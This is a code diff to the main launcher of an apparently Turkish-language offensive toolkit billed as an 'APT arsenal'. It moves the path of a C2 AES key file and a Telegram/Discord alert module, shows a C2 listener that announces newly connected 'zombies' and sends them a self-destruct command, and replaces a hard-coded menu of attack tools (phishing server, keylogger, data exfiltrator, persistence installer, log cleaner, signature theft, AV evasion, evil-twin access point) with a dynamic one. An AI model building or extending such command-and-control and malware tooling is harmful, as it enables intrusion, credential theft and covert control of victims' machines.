@@ -335,7 +335,7 @@ def c2_payload_builder(auto_lhost=None, auto_lport=None, auto_os=None, auto_anti
             sys.stdout.flush()
             
             aes_key = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
-            save_text(os.path.join(os.path.dirname(os.path.abspath(__file__)), "c2_aes_key.txt"), aes_key)
+            save_text(os.path.join(os.path.dirname(os.path.abspath(__file__)), "Moduller/Sistem/c2_aes_key.txt"), aes_key)
             print(f"{C.GREEN}  [+] AES-256 Anahtarı Üretildi ve Kaydedildi.{C.RESET}")
 
             # Reverse shell Python scripti oluştur
@@ -504,13 +504,13 @@ def c2_listener():
 
     # AES Key Yükle
     aes_key = None
-    key_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "c2_aes_key.txt")
+    key_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "Moduller/Sistem/c2_aes_key.txt")
     if os.path.exists(key_path):
         with open(key_path, "r") as f:
             aes_key = f.read().strip().encode('utf-8')
         print(f"{C.GREEN}  [+] Mevcut AES-256 Anahtarı yüklendi.{C.RESET}")
     else:
-        print(f"{C.YELLOW}  [!] Uyarı: AES-256 Anahtarı bulunamadı! (c2_aes_key.txt yok){C.RESET}")
+        print(f"{C.YELLOW}  [!] Uyarı: AES-256 Anahtarı bulunamadı! (Moduller/Sistem/c2_aes_key.txt yok){C.RESET}")
         print(f"{C.DIM}      Şifresiz (Plaintext) payload bağlantısı beklenecek.{C.RESET}")
 
     loot_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "loot")
@@ -534,8 +534,8 @@ def c2_listener():
         import sys
         sys.path.append(os.path.dirname(os.path.abspath(__file__)))
         try:
-            import Bildirim_Sistemi
-            Bildirim_Sistemi.send_alert(f"⚠️ YENİ BİR ZOMBİ BAĞLANDI!\n\nIP Adresi: {addr[0]}\nPort: {addr[1]}", title="🚀 C2 BAĞLANTISI BAŞARILI")
+            import Moduller.Sistem.Bildirim_Sistemi
+            Moduller.Sistem.Bildirim_Sistemi.send_alert(f"⚠️ YENİ BİR ZOMBİ BAĞLANDI!\n\nIP Adresi: {addr[0]}\nPort: {addr[1]}", title="🚀 C2 BAĞLANTISI BAŞARILI")
             print(f"{C.YELLOW}  [*] Bildirim Gönderildi (Telegram/Discord){C.RESET}")
         except Exception as e:
             print(f"Bildirim Hatasi: {e}")
@@ -573,8 +573,8 @@ def c2_listener():
                     print(f"\n{C.RED}{C.BOLD}  [☠️] KENDİNİ İMHA (KILL-SWITCH) BAŞLATILDI!{C.RESET}")
                     print(f"{C.RED}  [!] Kurban sistemindeki payload kendini imha komutu alıyor...{C.RESET}")
                     try:
-                        import Bildirim_Sistemi
-                        Bildirim_Sistemi.send_alert("PANIC MODE ACTIVATED! Wiping C2 and destroying zombies...", title="☠️ PANİK BUTONU TETİKLENDİ")
+                        import Moduller.Sistem.Bildirim_Sistemi
+                        Moduller.Sistem.Bildirim_Sistemi.send_alert("PANIC MODE ACTIVATED! Wiping C2 and destroying zombies...", title="☠️ PANİK BUTONU TETİKLENDİ")
                     except: pass
                     
                     if aes_key: conn.sendall(encrypt_aes("!suicide", aes_key) + b"\n")
@@ -811,341 +811,116 @@ class Program {{
 #  EXTERNAL TOOLS EXECUTOR
 # ══════════════════════════════════════════════════════════
 
-def prompt_for_tool(script_path):
-    """Her araç için özel, şık bir argüman sorma ekranı"""
-    args = []
-    
-    # --- Network Recon ---
-    if "Network_Scanner.py" in script_path:
-        print(f"{C.YELLOW}  [*] Network Scanner Sihirbazı{C.RESET}")
-        target = input(f"  {C.CYAN}[?] Hedef IP veya Aralık (örn: 192.168.1.1/24): {C.RESET}").strip()
-        if target: args.append(target)
-        
-    elif "DNS_Enumerator.py" in script_path:
-        print(f"{C.YELLOW}  [*] DNS Enumerator Sihirbazı{C.RESET}")
-        domain = input(f"  {C.CYAN}[?] Hedef Domain (örn: example.com): {C.RESET}").strip()
-        wordlist = input(f"  {C.CYAN}[?] Wordlist Yolu (Subdomain BF için, yoksa boş geçin): {C.RESET}").strip()
-        if domain: args.append(domain)
-        if wordlist: args.append(wordlist)
-        
-    elif "ARP_Spoofer.py" in script_path:
-        print(f"{C.YELLOW}  [*] ARP Spoofer Sihirbazı{C.RESET}")
-        target = input(f"  {C.CYAN}[?] Kurban IP Adresi: {C.RESET}").strip()
-        gateway = input(f"  {C.CYAN}[?] Gateway (Modem) IP Adresi: {C.RESET}").strip()
-        if target and gateway:
-            args.extend([target, gateway])
 
-    # --- Web Exploitation ---
-    elif "SQLi_Tester.py" in script_path or "XSS_Scanner.py" in script_path or "LFI_Scanner.py" in script_path or "CMS_Scanner.py" in script_path:
-        print(f"{C.YELLOW}  [*] Web Vulnerability Scanner Sihirbazı{C.RESET}")
-        url = input(f"  {C.CYAN}[?] Hedef URL (http/https dahil): {C.RESET}").strip()
-        if url: args.append(url)
-        
-    elif "Directory_Bruteforcer.py" in script_path:
-        print(f"{C.YELLOW}  [*] Directory Bruteforcer Sihirbazı{C.RESET}")
-        url = input(f"  {C.CYAN}[?] Hedef URL (http/https dahil): {C.RESET}").strip()
-        wordlist = input(f"  {C.CYAN}[?] Wordlist Yolu: {C.RESET}").strip()
-        if url and wordlist:
-            args.extend([url, wordlist])
+# --- KARARGAH DYNAMIC MENU ---
+R = C.RED
+G = C.GREEN
+Y = C.YELLOW
+C_color = C.CYAN
+W = C.RESET
+D = C.DIM
 
-    # --- Password Cracking ---
-    elif "Hash_Identifier.py" in script_path:
-        print(f"{C.YELLOW}  [*] Hash Identifier Sihirbazı{C.RESET}")
-        hash_val = input(f"  {C.CYAN}[?] Tanımlanacak Hash: {C.RESET}").strip()
-        if hash_val: args.append(hash_val)
-        
-    elif "Hash_Cracker.py" in script_path:
-        print(f"{C.YELLOW}  [*] Hash Cracker Sihirbazı{C.RESET}")
-        hash_val = input(f"  {C.CYAN}[?] Kırılacak Hash: {C.RESET}").strip()
-        wordlist = input(f"  {C.CYAN}[?] Wordlist Yolu: {C.RESET}").strip()
-        if hash_val and wordlist:
-            args.extend([hash_val, wordlist])
-            
-    elif "Zip_Cracker.py" in script_path:
-        print(f"{C.YELLOW}  [*] ZIP Cracker Sihirbazı{C.RESET}")
-        zip_file = input(f"  {C.CYAN}[?] Şifreli ZIP Dosyası: {C.RESET}").strip()
-        wordlist = input(f"  {C.CYAN}[?] Wordlist Yolu: {C.RESET}").strip()
-        if zip_file and wordlist:
-            args.extend([zip_file, wordlist])
-            
-    elif "SSH_Bruteforce.py" in script_path or "FTP_Bruteforce.py" in script_path:
-        print(f"{C.YELLOW}  [*] Brute-Force Sihirbazı{C.RESET}")
-        target = input(f"  {C.CYAN}[?] Hedef IP: {C.RESET}").strip()
-        user = input(f"  {C.CYAN}[?] Kullanıcı Adı: {C.RESET}").strip()
-        wordlist = input(f"  {C.CYAN}[?] Wordlist Yolu: {C.RESET}").strip()
-        if target and user and wordlist:
-            args.extend([target, user, wordlist])
+ASCII_ART = f"""{R}
+    ██████╗ ███████╗██████╗ ████████╗███████╗ █████╗ ███╗   ███╗
+    ██╔══██╗██╔════╝██╔══██╗╚══██╔══╝██╔════╝██╔══██╗████╗ ████║
+    ██████╔╝█████╗  ██║  ██║   ██║   █████╗  ███████║██╔████╔██║
+    ██╔══██╗██╔══╝  ██║  ██║   ██║   ██╔══╝  ██╔══██║██║╚██╔╝██║
+    ██║  ██║███████╗██████╔╝   ██║   ███████╗██║  ██║██║ ╚═╝ ██║
+    ╚═╝  ╚═╝╚══════╝╚═════╝    ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝
+    {W}{D}--- ⚡ Yüzde Yüz Türkçe ve Özelleştirilmiş APT Cephaneliği ⚡ ---{W}
+"""
 
-    # --- OSINT ---
-    elif "Email_Harvester.py" in script_path or "Whois_Lookup.py" in script_path:
-        print(f"{C.YELLOW}  [*] OSINT Sihirbazı{C.RESET}")
-        domain = input(f"  {C.CYAN}[?] Hedef Domain (örn: example.com): {C.RESET}").strip()
-        if domain: args.append(domain)
+def clear_screen():
+    os.system('cls' if os.name == 'nt' else 'clear')
 
-    # --- Social Engineering ---
-    elif "Phishing_Server.py" in script_path:
-        print(f"{C.YELLOW}  [*] Phishing Sunucu Sihirbazı{C.RESET}")
-        port = input(f"  {C.CYAN}[?] Dinlenecek Port {C.DIM}[8080]{C.RESET}: ").strip() or "8080"
-        redir = input(f"  {C.CYAN}[?] Kurban Nereye Yönlendirilsin? {C.DIM}[https://google.com]{C.RESET}: ").strip() or "https://google.com"
-        title = input(f"  {C.CYAN}[?] Sahte Sayfa Başlığı {C.DIM}[Kurumsal Portal]{C.RESET}: ").strip() or "Kurumsal Portal"
-        args.extend([port, redir, title])
-        
-    # --- Auto-Pwn ---
-    elif "Auto_Pwn.py" in script_path:
-        print(f"{C.YELLOW}  [*] Otopilot (Auto-Pwn) Sihirbazı{C.RESET}")
-        target = input(f"  {C.CYAN}[?] Hedef IP: {C.RESET}").strip()
-        wordlist = input(f"  {C.CYAN}[?] Wordlist Yolu (Opsiyonel): {C.RESET}").strip()
-        if target:
-            args.append(target)
-            if wordlist: args.append(wordlist)
+def get_categories():
+    base_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "Moduller")
+    if not os.path.exists(base_dir): return []
+    folders = [f for f in os.listdir(base_dir) if os.path.isdir(os.path.join(base_dir, f)) and f[0].isdigit()]
+    return sorted(folders)
 
-    # --- Post-Exploitation ---
-    elif "Reverse_Shell_Gen.py" in script_path:
-        print(f"{C.YELLOW}  [*] Reverse Shell Generator Sihirbazı{C.RESET}")
-        ip = input(f"  {C.CYAN}[?] LHOST (Saldırgan IP): {C.RESET}").strip()
-        port = input(f"  {C.CYAN}[?] LPORT (Saldırgan Port): {C.RESET}").strip()
-        lang = input(f"  {C.CYAN}[?] Dil (Opsiyonel, boş=tümü): {C.RESET}").strip()
-        if ip and port:
-            args.extend([ip, port])
-            if lang: args.append(lang)
-            
-    elif "Data_Exfiltrator.py" in script_path:
-        print(f"{C.YELLOW}  [*] Data Exfiltrator Sihirbazı{C.RESET}")
-        target_file = input(f"  {C.CYAN}[?] Sızdırılacak Dosya: {C.RESET}").strip()
-        server_ip = input(f"  {C.CYAN}[?] Alıcı Sunucu IP (Senin IP'n): {C.RESET}").strip()
-        if target_file and server_ip:
-            args.extend([target_file, server_ip])
+def list_files(category_folder):
+    base_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "Moduller")
+    cat_dir = os.path.join(base_dir, category_folder)
+    files = [f for f in os.listdir(cat_dir) if f.endswith('.py') or f.endswith('.bat')]
+    return sorted(files)
 
-    # --- AV Evasion ---
-    elif "Payload_Obfuscator.py" in script_path:
-        print(f"{C.YELLOW}  [*] Obfuscator Sihirbazı{C.RESET}")
-        in_file = input(f"  {C.CYAN}[?] Gizlenecek Python Dosyası: {C.RESET}").strip()
-        if in_file: args.append(in_file)
-
-    elif "Shellcode_Encoder.py" in script_path:
-        print(f"{C.YELLOW}  [*] Shellcode Encoder Sihirbazı{C.RESET}")
-        sc = input(f"  {C.CYAN}[?] Shellcode (hex formatında) veya Dosya Yolu: {C.RESET}").strip()
-        if sc: args.append(sc)
-
-    elif "SigThief.py" in script_path:
-        print(f"{C.YELLOW}  [*] SigThief (Sertifika Çalma) Sihirbazı{C.RESET}")
-        signed_file = input(f"  {C.CYAN}[?] Orijinal (İmzalı) EXE Yolu: {C.RESET}").strip()
-        target_file = input(f"  {C.CYAN}[?] Hedef (Zararlı) EXE Yolu: {C.RESET}").strip()
-        if signed_file and target_file:
-            args.extend([signed_file, target_file])
-
-    # --- Wireless ---
-    elif "Evil_Twin.py" in script_path:
-        print(f"\n{C.YELLOW}{C.BOLD}  [*] Gelişmiş Evil Twin (Sahte AP) Kurulum Sihirbazı{C.RESET}")
-        iface = input(f"  {C.CYAN}[?] WiFi Arayüzü {C.DIM}[wlan0]{C.RESET}: ").strip() or "wlan0"
-        ssid = input(f"  {C.CYAN}[?] Sahte Ağ Adı (SSID) {C.DIM}[FreeWiFi]{C.RESET}: ").strip() or "FreeWiFi"
-        kanal = input(f"  {C.CYAN}[?] WiFi Kanalı {C.DIM}[6]{C.RESET}: ").strip() or "6"
-        args.extend([iface, ssid, kanal])
-
-    # Özel parametre istemeyenler: Wordlist_Generator, Credential_Harvester, Screenshot_Grabber,
-    # Simple_Keylogger, Persistence_Installer, Log_Cleaner, PrivEsc araçları, Report_Generator vs.
-    return args
-
-def run_external_tool(script_path, desc):
+def run_script(path):
     clear_screen()
-    print_banner()
-    print(f"{C.MAGENTA}[*] Çalıştırılıyor: {desc}{C.RESET}\n")
-    print_line()
-    
-    if not os.path.exists(script_path):
-        print(f"{C.RED}\n[-] Dosya bulunamadı: {script_path}{C.RESET}")
-        input(f"\n{C.YELLOW}  Geri dönmek için Enter'a basın...{C.RESET}")
-        return
-
-    # Aracın parametrelerini sihirbazdan al
-    args = prompt_for_tool(script_path)
-    
-    print_line()
-    print(f"{C.GREEN}[+] Araç Çıktısı Başlıyor...{C.RESET}\n")
-    
-    cmd = [sys.executable, script_path] + args
-    try:
-        subprocess.run(cmd)
-    except KeyboardInterrupt:
-        print(f"\n{C.YELLOW}[*] Kullanıcı tarafından durduruldu.{C.RESET}")
-    except Exception as e:
-        print(f"\n{C.RED}[-] Çalıştırma hatası: {e}{C.RESET}")
-        
-    print(f"\n{C.GREEN}[+] Araç Çıktısı Bitti.{C.RESET}")
-    input(f"\n{C.YELLOW}  Ana menüye dönmek için Enter'a basın...{C.RESET}")
-
-def external_menu_category(title, tools):
-    while True:
-        clear_screen()
-        print_banner()
-        print(f"{C.BOLD}  {title.upper()}:{C.RESET}\n")
-        
-        for i, (name, path, desc, color) in enumerate(tools, 1):
-            print(f"  {C.CYAN}{i}){C.RESET} {color}{name:<25}{C.RESET} {C.DIM}— {desc}{C.RESET}")
-        print(f"  {C.CYAN}0){C.RESET} Geri Dön\n")
-
-        try:
-            choice = input(f"{C.CYAN}  [>] Seçiminiz: {C.RESET}").strip()
-            
-            if choice == '0':
-                break
-            elif choice.isdigit() and 1 <= int(choice) <= len(tools):
-                tool = tools[int(choice)-1]
-                run_external_tool(tool[1], tool[0])
-            else:
-                print(f"{C.RED}  [-] Geçersiz seçim.{C.RESET}")
-        except KeyboardInterrupt:
-            break
-
-# ══════════════════════════════════════════════════════════
-#  ANA MENÜ YÖNETİMİ
-# ══════════════════════════════════════════════════════════
+    print(f"{C_color}[*] Çalıştırılıyor: {path}{W}\n")
+    os.system(f'python "{path}"' if path.endswith('.py') else f'"{path}"')
+    input(f"\n{Y}[!] Devam etmek için ENTER tuşuna basın...{W}")
 
 def main_menu():
-    base_dir = os.path.dirname(os.path.abspath(__file__))
-    
-    # Tool Definitions: (Display Name, Relative Path, Description)
-    recon_tools = [
-        ("Network Scanner", os.path.join(base_dir, "Network Recon", "Network_Scanner.py"), "ARP ve ICMP yerel ağ taraması", C.GREEN),
-        ("DNS Enumerator", os.path.join(base_dir, "Network Recon", "DNS_Enumerator.py"), "DNS kayıtları ve Subdomain Brute-Force", C.YELLOW),
-        ("ARP Spoofer", os.path.join(base_dir, "Network Recon", "ARP_Spoofer.py"), "Yerel ağda Ortadaki Adam (MitM) saldırısı", C.RED)
-    ]
-    
-    osint_tools = [
-        ("Email Harvester", os.path.join(base_dir, "OSINT", "Email_Harvester.py"), "Google üzerinden hedef domain emaillerini topla", C.GREEN),
-        ("Whois Lookup", os.path.join(base_dir, "OSINT", "Whois_Lookup.py"), "Domain Whois ve kayıt bilgilerini sorgula", C.GREEN)
-    ]
-
-    se_tools = [
-        ("Phishing Server", os.path.join(base_dir, "Social Engineering", "Phishing_Server.py"), "Sahte login ekranı başlat ve şifreleri çal", C.RED)
-    ]
-
-    web_tools = [
-        ("CMS Vulnerability Scanner", os.path.join(base_dir, "Web Exploitation", "CMS_Scanner.py"), "WP/Joomla vs. versiyon ve açık tarayıcı", C.GREEN),
-        ("SQLi Tester", os.path.join(base_dir, "Web Exploitation", "SQLi_Tester.py"), "SQL Injection tespiti (Error/Time-Based)", C.YELLOW),
-        ("XSS Scanner", os.path.join(base_dir, "Web Exploitation", "XSS_Scanner.py"), "Gelişmiş Reflected XSS tespiti", C.YELLOW),
-        ("Directory Bruteforcer", os.path.join(base_dir, "Web Exploitation", "Directory_Bruteforcer.py"), "Gizli dizin ve dosya bulucu", C.YELLOW),
-        ("LFI Scanner", os.path.join(base_dir, "Web Exploitation", "LFI_Scanner.py"), "Local File Inclusion tarayıcı", C.RED)
-    ]
-    
-    pwd_tools = [
-        ("Wordlist Generator", os.path.join(base_dir, "Password Cracking", "Wordlist_Generator.py"), "Hedef odaklı özel şifre listesi üret", C.GREEN),
-        ("Hash Identifier", os.path.join(base_dir, "Password Cracking", "Hash_Identifier.py"), "Hash formatını belirle", C.GREEN),
-        ("Multi Hash Cracker", os.path.join(base_dir, "Password Cracking", "Hash_Cracker.py"), "MD5/SHA1/SHA256/NTLM Kırma", C.YELLOW),
-        ("ZIP Password Cracker", os.path.join(base_dir, "Password Cracking", "Zip_Cracker.py"), "Şifreli ZIP dosyalarını kırma", C.YELLOW),
-        ("SSH Bruteforce", os.path.join(base_dir, "Password Cracking", "SSH_Bruteforce.py"), "SSH login denemeleri", C.RED),
-        ("FTP Bruteforce", os.path.join(base_dir, "Password Cracking", "FTP_Bruteforce.py"), "FTP login denemeleri", C.RED)
-    ]
-    
-    post_tools = [
-        ("Reverse Shell Generator", os.path.join(base_dir, "Post-Exploitation", "Reverse_Shell_Gen.py"), "Çoklu dilde hazır shell kodu üret", C.GREEN),
-        ("Credential Harvester", os.path.join(base_dir, "Post-Exploitation", "Credential_Harvester.py"), "WiFi şifreleri ve sistem bilgisi", C.YELLOW),
-        ("Screenshot Grabber", os.path.join(base_dir, "Post-Exploitation", "Screenshot_Grabber.py"), "Hedef ekrandan görüntü alma", C.YELLOW),
-        ("Advanced Keylogger", os.path.join(base_dir, "Post-Exploitation", "Simple_Keylogger.py"), "Pencere takipli klavye dinleyici", C.RED),
-        ("Data Exfiltrator", os.path.join(base_dir, "Post-Exploitation", "Data_Exfiltrator.py"), "B64/HTTP ile veri sızdırma", C.RED),
-        ("Persistence Installer", os.path.join(base_dir, "Post-Exploitation", "Persistence_Installer.py"), "Kalıcılık sağlama (Registry/Cron)", C.RED),
-        ("Log Cleaner", os.path.join(base_dir, "Post-Exploitation", "Log_Cleaner.py"), "İz silme — Windows/Linux log temizleyici", C.RED)
-    ]
-    
-    priv_tools = [
-        ("Linux PrivEsc Checker", os.path.join(base_dir, "Privilege Escalation", "Linux_PrivEsc_Checker.py"), "Linux yetki yükseltme vektörleri taraması", C.GREEN),
-        ("Windows PrivEsc Checker", os.path.join(base_dir, "Privilege Escalation", "Windows_PrivEsc_Checker.bat"), "Windows yetki yükseltme (Bat script)", C.GREEN)
-    ]
-    
-    av_tools = [
-        ("Payload Obfuscator", os.path.join(base_dir, "AV Evasion", "Payload_Obfuscator.py"), "Python scriptlerini gizleme", C.YELLOW),
-        ("Shellcode Encoder", os.path.join(base_dir, "AV Evasion", "Shellcode_Encoder.py"), "XOR ile Shellcode şifreleme", C.YELLOW),
-        ("SigThief (Digital Signature Spoofing)", os.path.join(base_dir, "AV Evasion", "SigThief.py"), "Yasal EXE'den dijital imza çalıp Payload'a ekleme", C.YELLOW)
-    ]
-
-    wireless_tools = [
-        ("Evil Twin", os.path.join(base_dir, "Wireless Attacks", "Evil_Twin.py"), "Sahte WiFi AP + Captive Portal (Linux)", C.RED)
-    ]
-    
-    reporting_tools = [
-        ("HTML Report Generator", os.path.join(base_dir, "Reporting", "Report_Generator.py"), "Sızma testi bulgularını HTML rapora çevir", C.GREEN)
-    ]
-
     while True:
         clear_screen()
-        print_banner()
-        print(f"{C.BOLD}  RİSK BİLGİLENDİRMESİ:{C.RESET}")
-        print(f"  {C.GREEN}■ DÜŞÜK RİSK{C.RESET}  : Tespit/Kontrol/OSINT araçları. İz bırakmaz.")
-        print(f"  {C.YELLOW}■ ORTA RİSK{C.RESET}   : Tarayıcılar/Bruteforce. Log bırakabilir.")
-        print(f"  {C.RED}■ YÜKSEK RİSK{C.RESET} : İstismar/Kalıcılık/C2. Doğrudan müdahale.\n")
-        print(f"{C.DIM}{'─' * 65}{C.RESET}\n")
-
-        print(f"{C.BOLD}  KATEGORİLER:{C.RESET}\n")
+        print(ASCII_ART)
+        categories = get_categories()
         
-        print(f"  {C.CYAN}1){C.RESET} {C.GREEN}OSINT (Açık Kaynak İstihbarat){C.RESET} {C.DIM}— Email Harvester, Whois{C.RESET}")
-        print(f"  {C.CYAN}2){C.RESET} {C.YELLOW}Social Engineering (Oltalama){C.RESET} {C.DIM}— Phishing Server{C.RESET}")
-        print(f"  {C.CYAN}3){C.RESET} {C.GREEN}Privilege Escalation{C.RESET}         {C.DIM}— Windows/Linux PrivEsc Checker{C.RESET}")
-        print(f"  {C.CYAN}4){C.RESET} {C.GREEN}AV Evasion{C.RESET}                   {C.DIM}— Obfuscator, Shellcode Encoder{C.RESET}")
-        print(f"  {C.CYAN}5){C.RESET} {C.YELLOW}Network Recon{C.RESET}                {C.DIM}— Ağ tarama, DNS, ARP Spoofing{C.RESET}")
-        print(f"  {C.CYAN}6){C.RESET} {C.YELLOW}Web Exploitation{C.RESET}             {C.DIM}— CMS Scanner, SQLi, XSS, Dir Buster{C.RESET}")
-        print(f"  {C.CYAN}7){C.RESET} {C.YELLOW}Password Cracking{C.RESET}            {C.DIM}— Wordlist, Hash, SSH/FTP Brute{C.RESET}")
-        print(f"  {C.CYAN}8){C.RESET} {C.RED}Post-Exploitation{C.RESET}            {C.DIM}— Shell Gen, Keylogger, Log Cleaner{C.RESET}")
-        print(f"  {C.CYAN}9){C.RESET} {C.RED}Wireless Attacks{C.RESET}             {C.DIM}— Evil Twin, Sahte WiFi AP{C.RESET}")
-        print(f" {C.CYAN}10){C.RESET} {C.RED}C2 Framework{C.RESET}                 {C.DIM}— Payload Builder & Listener (Stealth){C.RESET}")
-        print(f" {C.CYAN}11){C.RESET} {C.MAGENTA}Reporting (Raporlama){C.RESET}        {C.DIM}— Otomatik HTML Pentest Raporu Üretici{C.RESET}")
-        print(f" {C.CYAN}12){C.RESET} {C.RED}{C.BOLD}🤖 Auto-Pwn (Otopilot){C.RESET}       {C.DIM}— Taramadan Exploit'e otomatik saldırı motoru{C.RESET}")
-        print(f" {C.CYAN}13){C.RESET} {C.CYAN}{C.BOLD}🌐 Web Dashboard{C.RESET}           {C.DIM}— Araçları tarayıcıdan yönet (Flask Web UI){C.RESET}")
-        print(f"  {C.CYAN}0){C.RESET} Çıkış\n")
-
-        try:
-            choice = input(f"{C.CYAN}  [>] Seçiminiz: {C.RESET}").strip()
-        except KeyboardInterrupt:
-            clear_screen()
-            print(f"{C.RED}  [*] The Ultimate Pentest Arsenal kapatılıyor... İyi avlar!{C.RESET}\n")
+        print(f"{C_color}[ M E N Ü ]{W}\n")
+        print(f"  {G}0.{W} Komuta_Kontrol_Merkezi_C2.py {R}[🔥 ANA SİSTEM]{W}")
+        print(f"  {G}00.{W} Oto_Sizma_Araci.py {R}[⚔️ OTOMASYON]{W}")
+        print()
+        
+        for i, cat in enumerate(categories, 1):
+            cat_name = cat.split('_', 1)[1].replace('_', ' ')
+            print(f"  {G}{i}.{W} {cat_name}")
+            
+        print(f"\n  {R}99.{W} Çıkış")
+        
+        choice = input(f"\n{Y}arsenal@karargah:~# {W}").strip()
+        
+        if choice == '99':
+            print(f"{C_color}[*] Sistemden çıkılıyor... Güvende kalın!{W}")
             sys.exit(0)
-
-        if choice == '1':
-            external_menu_category("OSINT", osint_tools)
-        elif choice == '2':
-            external_menu_category("Social Engineering", se_tools)
-        elif choice == '3':
-            external_menu_category("Privilege Escalation", priv_tools)
-        elif choice == '4':
-            external_menu_category("AV Evasion", av_tools)
-        elif choice == '5':
-            external_menu_category("Network Recon", recon_tools)
-        elif choice == '6':
-            external_menu_category("Web Exploitation", web_tools)
-        elif choice == '7':
-            external_menu_category("Password Cracking", pwd_tools)
-        elif choice == '8':
-            external_menu_category("Post-Exploitation", post_tools)
-        elif choice == '9':
-            external_menu_category("Wireless Attacks", wireless_tools)
-        elif choice == '10':
+        elif choice == '0':
+            # C2 Alt Menüsü
             while True:
                 clear_screen()
-                print_banner()
-                print(f"{C.BOLD}  C2 FRAMEWORK:{C.RESET}\n")
-                print(f"  {C.CYAN}1){C.RESET} Payload Builder (EXE Oluştur)")
-                print(f"  {C.CYAN}2){C.RESET} Listener (Dinleyici)")
-                print(f"  {C.CYAN}3){C.RESET} EXE Disguise (Dosya Kılık Değiştirme)")
-                print(f"  {C.CYAN}0){C.RESET} Geri Dön\n")
-                try:
-                    c2c = input(f"{C.CYAN}  [>] Seçiminiz: {C.RESET}").strip()
-                except KeyboardInterrupt:
-                    break
+                print(ASCII_ART)
+                print(f"{C_color}[ C2 KOMUTA MERKEZİ ]{W}\n")
+                print(f"  {G}1.{W} Payload Builder (EXE Oluştur)")
+                print(f"  {G}2.{W} Listener (Dinleyici)")
+                print(f"  {G}3.{W} EXE Disguise (Dosya Kılık Değiştirme)")
+                print(f"\n  {R}0.{W} Ana Menüye Dön")
+                c2_choice = input(f"\n{Y}c2@karargah:~# {W}").strip()
+                if c2_choice == '1': c2_payload_builder()
+                elif c2_choice == '2': c2_listener()
+                elif c2_choice == '3': c2_disguise()
+                elif c2_choice == '0': break
 
-                if c2c == '1': c2_payload_builder()
-                elif c2c == '2': c2_listener()
-                elif c2c == '3': c2_disguise()
-                elif c2c == '0': break
-        elif choice == '11':
-            external_menu_category("Reporting", reporting_tools)
-        elif choice == '12':
-            run_external_tool(os.path.join(base_dir, "Auto_Pwn.py"), "Auto-Pwn Engine")
-        elif choice == '13':
-            import Web_Dashboard
-            Web_Dashboard.start_web_server()
-        elif choice == '0':
-            clear_screen()
-            print(f"{C.RED}  [*] The Ultimate Pentest Arsenal kapatılıyor... İyi avlar!{C.RESET}\n")
-            sys.exit(0)
+        elif choice == '00':
+            run_script('Moduller/00_Oto_Sizma_Araci/Oto_Sizma_Araci.py')
+        elif choice.isdigit() and 1 <= int(choice) <= len(categories):
+            cat_folder = categories[int(choice)-1]
+            category_menu(cat_folder)
+
+def category_menu(cat_folder):
+    while True:
+        clear_screen()
+        cat_name = cat_folder.split('_', 1)[1].replace('_', ' ')
+        print(f"{R}>> {cat_name} <<{W}\n")
+        
+        files = list_files(cat_folder)
+        if not files:
+            print(f"{D}Bu kategoride araç bulunamadı.{W}")
+        else:
+            for i, f in enumerate(files, 1):
+                print(f"  {G}{i}.{W} {f}")
+                
+        print(f"\n  {R}0.{W} Geri Dön")
+        
+        choice = input(f"\n{Y}{cat_name.lower()}@karargah:~# {W}").strip()
+        
+        if choice == '0':
+            break
+        elif choice.isdigit() and 1 <= int(choice) <= len(files):
+            script_path = os.path.join("Moduller", cat_folder, files[int(choice)-1])
+            run_script(script_path)
 
 if __name__ == "__main__":
-    main_menu()
+    try:
+        main_menu()
+    except KeyboardInterrupt:
+        print(f"\n{R}[!] Zorla çıkış yapıldı.{W}")
+        sys.exit(0)
